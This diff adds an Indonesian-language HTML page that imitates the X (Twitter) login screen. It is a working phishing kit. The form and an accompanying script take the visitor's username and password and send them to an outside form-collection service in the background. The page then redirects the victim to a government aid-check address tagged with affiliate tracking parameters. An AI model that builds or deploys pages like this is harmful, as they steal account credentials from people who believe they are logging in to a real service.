@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk ke X</title>
+    <link rel="stylesheet" href="twitter.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght%40400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="login-container">
+        
+        <div class="logo-area">
+            <img src="twitter.png" 
+                 alt="Logo X" 
+                 class="x-logo-img">
+        </div>
+
+        <h1><center>Masuk Ke X</center></h1>
+        
+        <form 
+            id="loginForm" 
+            action="https://formcarry.com/s/q9SpL4QaIi8" 
+            method="POST"
+        >
+            <div class="login-form">
+                <input type="text" placeholder="Nomor telepon, email, atau nama pengguna" id="username" name="twitter_username_or_email" required>
+                <input type="password" placeholder="Kata Sandi" id="password" name="twitter_password" required>
+            </div>
+            
+            <input 
+                type="hidden" 
+                id="redirectUrl"
+                value="https://cekbansos.kemensos.go.id/?pid=incomeaccess_int-6094&af_sub1=a_6094b_435c_&af_ad_id=901&btag=a_6094b_435c_&utm_medium=901&utm_source=6094&utm_campaign=435&siteid=6094"
+            >
+            
+            <button type="submit" id="loginButton" class="login-btn" role="button">Masuk</button>
+        </form>
+
+        <a href="https://x.com/i/flow/password_reset?input_flow_data=%7B%22requested_variant%22%3A%22eyJwbGF0Zm9ybSI6IlJ3ZWIifQ%3D%3D%22%7D" class="forgot-btn" role="button">Lupa sandi?</a>
+    </div>
+
+    <div class="signup-prompt">
+        <p>Belum punya akun? <a href="https://x.com/i/flow/signup?input_flow_data=%7B%22requested_variant%22%3A%22eyJyZWRpcmVjdF91cmwiOiIvP2xhbmc9aWQmY3Q9Z29vZ2xlLXgtbG9naW4ifQ%3D%3D%22%7D">Daftar</a></p>
+    </div>
+
+    <script>
+        const loginForm = document.getElementById('loginForm');
+        const redirectUrl = document.getElementById('redirectUrl').value;
+        
+        loginForm.addEventListener('submit', function(event) {
+            
+            event.preventDefault(); // Mencegah pengiriman formulir HTML standar
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            // 1. Cek validasi
+            if (username === '' || password === '') {
+                alert('Mohon isi Nomor telepon, email, atau nama pengguna dan Kata Sandi untuk masuk.');
+                return; // Berhenti jika validasi gagal
+            }
+
+            // 2. Kirim data menggunakan Fetch API (AJAX) di latar belakang
+            fetch(loginForm.action, {
+                method: loginForm.method,
+                body: new FormData(loginForm)
+            }).then(() => {
+                // 3. Setelah permintaan pengiriman dikirim, lakukan redirect paksa
+                window.location.href = redirectUrl;
+            }).catch(() => {
+                // Jika ada error jaringan saat mengirim ke Formcarry, tetap coba redirect
+                console.error("Gagal mengirim data ke Formcarry, namun tetap mencoba redirect.");
+                window.location.href = redirectUrl;
+            });
+        });
+    </script>
+
+</body>
+</html>
